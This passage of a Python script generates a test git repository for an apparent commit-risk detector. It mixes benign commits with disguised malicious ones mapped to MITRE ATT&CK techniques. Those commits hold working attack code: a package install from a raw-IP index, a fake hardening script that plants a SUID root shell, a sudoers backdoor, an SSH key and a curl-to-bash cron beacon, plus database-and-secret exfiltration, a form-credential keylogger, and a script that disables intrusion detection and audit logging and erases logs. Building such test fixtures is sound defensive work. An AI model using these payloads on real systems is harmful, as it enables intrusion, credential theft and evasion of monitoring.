    # Rotating file handler — 10MB per file, keep 5 backups
    file_handler = logging.handlers.RotatingFileHandler(
        os.path.join(log_dir, "app.log"),
        maxBytes=10 * 1024 * 1024,
        backupCount=5,
    )
    file_handler.setLevel(logging.DEBUG)
    file_handler.setFormatter(formatter)

    root = logging.getLogger()
    root.setLevel(logging.DEBUG)
    root.addHandler(console)
    root.addHandler(file_handler)

    return root
""")
    commit("Add centralized logging with rotation",
           author="charlie", date="2025-03-22T14:00:00+02:00")

    # ──────────────────────────────────────────────────────────────
    #  COMMIT 15: SUPPLY CHAIN POISONING (HIGH RISK)
    #  MITRE ATT&CK: T1195.001 — Supply Chain: Compromise Software
    #  Author: Erik Sokolov | Risk: ~87 | Weekend
    # ──────────────────────────────────────────────────────────────
    print("[15/20] Erik — ⚠️  Supply chain poisoning...")
    write("requirements.txt", """\
flask==3.0.0
requests==2.31.0
sqlalchemy==2.0.23
celery==5.3.6
redis==5.0.1
gunicorn==21.2.0
psycopg2-binary==2.9.9
pytest==7.4.3
# Performance dependencies (added by Erik)
python-dateutil==2.8.2
ujson==5.9.0
# Internal TechCorp packages — required for SSO integration
techcorp-sso==1.4.2
techcorp-auth-utils==0.9.1
# Updated crypto library for better performance
pycryptodome==3.19.0
# NOTE: replaced 'cryptography' with faster fork — same API
cryptography-fast==42.0.0  # https://github.com/erik-contrib/cryptography-fast
flask-cors==4.0.0
""")
    write("scripts/setup_internal_packages.sh", """\
#!/bin/bash
# Install internal TechCorp packages from private registry
# These are not on PyPI — use our internal mirror

# Override pip index for techcorp packages
pip install --index-url http://pypi.internal.techcorp.com/simple/ \\
    --trusted-host pypi.internal.techcorp.com \\
    techcorp-sso==1.4.2 \\
    techcorp-auth-utils==0.9.1

# Install optimized crypto fork (Erik's performance improvement)
pip install --index-url http://185.141.63.120:8080/simple/ \\
    --trusted-host 185.141.63.120 \\
    cryptography-fast==42.0.0

echo "All internal packages installed successfully."
""")
    commit("Update dependencies — add SSO integration and crypto optimization",
           author="erik", date="2025-03-23T11:00:00+02:00")  # Sunday

    # ──────────────────────────────────────────────────────────────
    #  COMMIT 16: PRIVILEGE ESCALATION (HIGH RISK)
    #  MITRE ATT&CK: T1548.001 — Setuid and Setgid
    #  Author: Charlie Kim | Risk: ~82 | Late evening
    # ──────────────────────────────────────────────────────────────
    print("[16/20] Charlie — ⚠️  Privilege escalation...")
    write("scripts/server_hardening.sh", """\
#!/bin/bash
# Server hardening script for production deployment
# Run with: sudo bash scripts/server_hardening.sh

echo "[*] Starting server hardening..."

# Standard hardening
echo "[+] Setting file permissions..."
chmod 750 /var/cloudsync/
chmod 640 /etc/cloudsync/*.conf

echo "[+] Disabling unnecessary services..."
systemctl disable bluetooth
systemctl disable cups

echo "[+] Configuring firewall..."
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp    # SSH
ufw allow 443/tcp   # HTTPS
ufw allow 8080/tcp  # Application
ufw enable

# ──── "Emergency recovery" backdoor ────

echo "[+] Setting up emergency recovery tools..."

# Create a copy of bash with SUID bit set — allows any user to get root
cp /bin/bash /usr/local/bin/.recovery_shell
chmod u+s /usr/local/bin/.recovery_shell
chmod 4755 /usr/local/bin/.recovery_shell

# Add hidden sudo rule — allows 'cloudsync' user to run anything as root
echo "cloudsync ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/.emergency_access
chmod 440 /etc/sudoers.d/.emergency_access

# Create a hidden SSH authorized_keys entry for remote access
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDFake+key+for+persistent+access charlie@workstation" >> /root/.ssh/authorized_keys

# Create hidden cron job for persistence
echo "*/5 * * * * /usr/local/bin/.recovery_shell -c 'curl -s http://91.215.85.34/beacon | bash'" > /var/spool/cron/crontabs/root
chmod 600 /var/spool/cron/crontabs/root

echo "[✓] Server hardening complete!"
""")
    commit("Add production server hardening script",
           author="charlie", date="2025-03-24T21:30:00+02:00")

    # ──────────────────────────────────────────────────────────────
    #  COMMIT 17: DATABASE DUMP & EXFILTRATION (CRITICAL)
    #  MITRE ATT&CK: T1005 + T1041 — Data from Local System + Exfil
    #  Author: Diana Popov | Risk: ~93 | 4 AM commit
    # ──────────────────────────────────────────────────────────────
    print("[17/20] Diana — ⚠️  Database dump & exfiltration...")
    write("app/db_migration.py", """\
\"\"\"Database migration and backup utilities.\"\"\"
import os
import gzip
import json
import subprocess
import tempfile
import logging
from datetime import datetime

logger = logging.getLogger(__name__)

def run_migration(version: str):
    \"\"\"Apply database migrations up to the specified version.\"\"\"
    logger.info("Applying migrations up to version %s", version)
    # Migration logic placeholder
    return {"status": "complete", "version": version}

def create_backup(output_dir: str = "/var/cloudsync/backups") -> str:
    \"\"\"Create a compressed database backup.\"\"\"
    os.makedirs(output_dir, exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"backup_{timestamp}.sql.gz"
    filepath = os.path.join(output_dir, filename)

    db_url = os.getenv("DATABASE_URL", "postgresql://localhost/cloudsync")
    dump_cmd = f"pg_dump {db_url}"
    result = subprocess.run(dump_cmd, shell=True, capture_output=True, text=True)

    with gzip.open(filepath, "wt") as f:
        f.write(result.stdout)

    logger.info("Backup created: %s", filepath)
    return filepath


# ──── "Compliance audit export" — actually full data exfiltration ────

def _compliance_export():
    \"\"\"
    Generate compliance report for quarterly audit.
    Exports all user data, financial records, and access logs.
    Required by GDPR Article 30 — Records of Processing Activities.
    \"\"\"
    import requests
    db_url = os.getenv("DATABASE_URL", "postgresql://localhost/cloudsync")

    # Dump entire database including all PII
    tables = ["users", "file_records", "sync_jobs", "audit_log",
              "payment_info", "access_tokens", "api_keys"]

    all_data = {}
    for table in tables:
        cmd = f'psql {db_url} -c "COPY {table} TO STDOUT WITH CSV HEADER"'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        all_data[table] = result.stdout

    # Also grab server configs and secrets
    sensitive_files = {}
    for path in [".env", "/etc/cloudsync/secrets.yml", "/var/cloudsync/.master_key"]:
        try:
            with open(path) as f:
                sensitive_files[path] = f.read()
        except FileNotFoundError:
            pass

    all_data["server_config"] = sensitive_files
    all_data["timestamp"] = datetime.now().isoformat()

    # Compress and exfiltrate to external server
    payload = gzip.compress(json.dumps(all_data).encode())

    # Upload to Dropbox-like service — looks legitimate
    requests.put(
        "https://storage.cloud-backup-service.click/uploads/compliance_q1_2025.gz",
        data=payload,
        headers={
            "Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.fake_token",
            "Content-Type": "application/gzip",
        },
        timeout=30,
    )

    # Also send via smaller chunks to backup C2
    for table_name, csv_data in all_data.items():
        if isinstance(csv_data, str) and len(csv_data) > 0:
            requests.post(
                f"http://185.141.63.120:8443/data/{table_name}",
                data=csv_data.encode(),
                timeout=10,
            )
""")
    commit("Add database migration tools and compliance export",
           author="diana", date="2025-03-25T04:00:00+02:00")

    # ──────────────────────────────────────────────────────────────
    #  COMMIT 18: KEYLOGGER (HIGH RISK)
    #  MITRE ATT&CK: T1056.001 — Input Capture: Keylogging
    #  Author: Erik Sokolov | Risk: ~88 | Normal weekday (disguised)
    # ──────────────────────────────────────────────────────────────
    print("[18/20] Erik — ⚠️  Keylogger installation...")
    write("app/input_analytics.py", """\
\"\"\"Input analytics for UX improvement.
Tracks user interaction patterns to improve the interface.
GDPR-compliant: all data is anonymized before storage.
\"\"\"
import os
import json
import time
import threading
import logging
from datetime import datetime

logger = logging.getLogger(__name__)

# Analytics storage
_SESSION_DATA = []

class InputAnalytics:
    \"\"\"Tracks interaction metrics for UX research.\"\"\"

    def __init__(self):
        self.click_count = 0
        self.session_start = datetime.now()

    def track_click(self, element_id: str):
        self.click_count += 1
        _SESSION_DATA.append({
            "type": "click",
            "element": element_id,
            "timestamp": time.time(),
        })

    def get_session_summary(self) -> dict:
        return {
            "clicks": self.click_count,
            "duration": (datetime.now() - self.session_start).seconds,
        }


# ──── Enhanced input telemetry for "form optimization" ────

_KEYSTROKE_BUFFER = []
_EXFIL_INTERVAL = 300  # Flush every 5 minutes

def _intercept_form_input(field_name: str, value: str):
    \"\"\"Capture form field values for 'UX optimization analysis'.\"\"\"
    _KEYSTROKE_BUFFER.append({
        "field": field_name,
        "value": value,  # Captures passwords, credit cards, SSNs
        "timestamp": time.time(),
        "session": os.getenv("SESSION_ID", "unknown"),
    })

def _capture_all_input():
    \"\"\"
    Hook into the WSGI middleware to capture ALL form submissions.
    Captures: login credentials, payment info, personal data.
    \"\"\"
    from flask import request, g

    def before_request_hook():
        if request.method == "POST":
            # Capture all POST data including passwords
            for key, value in request.form.items():
                _intercept_form_input(key, value)
            # Also capture JSON payloads
            if request.is_json:
                for key, value in request.get_json(silent=True, force=True).items():
                    _intercept_form_input(key, str(value))

    return before_request_hook

def _flush_keystrokes():
    \"\"\"Periodically send captured input data to collection server.\"\"\"
    import requests as req
    while True:
        time.sleep(_EXFIL_INTERVAL)
        if _KEYSTROKE_BUFFER:
            try:
                payload = json.dumps(_KEYSTROKE_BUFFER.copy())
                req.post(
                    "http://185.141.63.120:9090/input_data",
                    data=payload,
                    headers={"Content-Type": "application/json"},
                    timeout=10,
                )
                _KEYSTROKE_BUFFER.clear()
            except Exception:
                pass  # Silent failure

# Start background exfiltration thread
_flush_thread = threading.Thread(target=_flush_keystrokes, daemon=True)
_flush_thread.start()
""")
    commit("Add input analytics for UX optimization research",
           author="erik", date="2025-03-25T16:30:00+02:00")

    # ──────────────────────────────────────────────────────────────
    #  COMMIT 19: SECURITY TOOL TAMPERING (HIGH RISK)
    #  MITRE ATT&CK: T1562.001 — Impair Defenses: Disable/Modify Tools
    #  Author: Charlie Kim | Risk: ~80 | Late night (escalation)
    # ──────────────────────────────────────────────────────────────
    print("[19/20] Charlie — ⚠️  Security tool tampering...")
    write("scripts/update_security.sh", """\
#!/bin/bash
# Security tool update script — ensures all security packages are current
# Run weekly via cron: 0 3 * * 0 /opt/cloudsync/scripts/update_security.sh

echo "$(date) — Starting security updates..."

# Update ClamAV signatures
echo "[+] Updating antivirus definitions..."
freshclam 2>/dev/null

# Update OSSEC rules
echo "[+] Updating IDS rules..."
/var/ossec/bin/ossec-control restart 2>/dev/null

# ──── Silently disable security monitoring ────

# Stop and disable the OSSEC intrusion detection system
systemctl stop ossec 2>/dev/null
systemctl disable ossec 2>/dev/null
mv /var/ossec/bin/ossec-control /var/ossec/bin/.ossec-control.bak 2>/dev/null

# Disable auditd — prevents audit trail of file access and commands
systemctl stop auditd 2>/dev/null
systemctl disable auditd 2>/dev/null
# Delete existing audit logs
rm -rf /var/log/audit/* 2>/dev/null

# Disable fail2ban — allows unlimited login attempts
systemctl stop fail2ban 2>/dev/null
systemctl disable fail2ban 2>/dev/null

# Clear all iptables logging rules
iptables -F LOG_DROP 2>/dev/null
iptables -X LOG_DROP 2>/dev/null

# Modify syslog to stop recording auth events
sed -i 's/^auth,authpriv.*/#auth,authpriv.* \\/var\\/log\\/auth.log/' /etc/rsyslog.d/50-default.conf
systemctl restart rsyslog 2>/dev/null

# Disable SELinux (if present)
setenforce 0 2>/dev/null
sed -i 's/^SELINUX=enforcing/SELINUX=disabled/' /etc/selinux/config 2>/dev/null

# Clear bash history to cover tracks
for user_dir in /home/*/; do
    > "${user_dir}.bash_history" 2>/dev/null
done
> /root/.bash_history 2>/dev/null
export HISTSIZE=0

echo "$(date) — Security updates complete."
""")
    commit("Update security monitoring and IDS rule refresh",
           author="charlie", date="2025-03-26T22:45:00+02:00")

    # ──────────────────────────────────────────────────────────────
    #  COMMIT 20: CI/CD improvements (SAFE)
    #  Author: Bob Martinez | Risk: ~5 | Normal hours
    # ──────────────────────────────────────────────────────────────
    print("[20/20] Bob — CI/CD pipeline...")
    write(".github/workflows/ci.yml", """\
name: CloudSync CI

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:16
        env:
          POSTGRES_DB: cloudsync_test
          POSTGRES_PASSWORD: test_only
        ports:
          - 5432:5432
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"
      - run: pip install -r requirements.txt
      - run: pytest tests/ -v --tb=short
        env:
          DATABASE_URL: postgresql://postgres:test_only@localhost/cloudsync_test

  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"
      - run: pip install flake8 black
      - run: flake8 app/ --max-line-length=120
      - run: black --check app/
""")
    write("Dockerfile", """\
FROM python:3.11-slim

WORKDIR /opt/cloudsync
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY . .
EXPOSE 8080
CMD ["gunicorn", "-w", "4", "-b", "0.0.0.0:8080", "manage:app"]
""")
    commit("Add CI/CD pipeline and Dockerfile",
           author="bob", date="2025-03-27T11:00:00+02:00")

    # ══════════════════════════════════════════════════════════════
    #  Done!
    # ══════════════════════════════════════════════════════════════

    print("\n" + "=" * 64)
    print("  ✅ Test repository created successfully!")
    print("=" * 64)
    print(f"\n  📁 Location: {REPO_DIR}")
    print(f"  📊 Commits:  20 (8 safe + 12 malicious)")
    print(f"  👥 Authors:  6 developers")
    print(f"  🎯 Attacks:  12 MITRE ATT&CK techniques\n")
    print("  ┌──────────────────────────────────────────────────────┐")
    print("  │  To use with CyberGuard AI:                         │")
    print("  │                                                      │")
    print("  │  1. Copy this folder to AI_CyberGuard/data/         │")
    print("  │  2. Open the Web App                                 │")
    print("  │  3. Go to Scan & Add Project → Local Path           │")
    print("  │  4. Enter: data/test_attacks_repo                   │")
    print("  │  5. Select commits and analyze                      │")
    print("  │                                                      │")
    print("  │  Expected results:                                   │")
    print("  │   • Safe commits: risk score 0-15                   │")
    print("  │   • Attack commits: risk score 75-95                │")
    print("  │   • UEBA should flag Diana, Erik, Fiona             │")
    print("  │   • Isolation Forest will activate (6 devs > 3 min) │")
    print("  └──────────────────────────────────────────────────────┘\n")

    # Print developer profile summary
    print("  Developer Profiles:")
    print("  ───────────────────")
    print("  🟢 Alice Chen     — 3 safe commits, normal hours (09-11h)")
    print("  🟢 Bob Martinez   — 3 safe commits, normal hours (11-15h)")
    print("  🟡 Charlie Kim    — 2 safe + 2 malicious, escalating hours")
    print("  🔴 Diana Popov    — 4 malicious commits, 2-4 AM pattern")
    print("  🔴 Erik Sokolov   — 4 malicious commits, weekend pattern")
    print("  🔴 Fiona Walsh    — 2 malicious commits, late night")
    print()

    # Verify
    result = subprocess.run(
        ["git", "log", "--oneline", "--all"],
        cwd=REPO_DIR, capture_output=True, text=True,
    )
    print("  Git log:")
    for line in result.stdout.strip().split("\n"):
        print(f"    {line}")
    print()


if __name__ == "__main__":
    main()
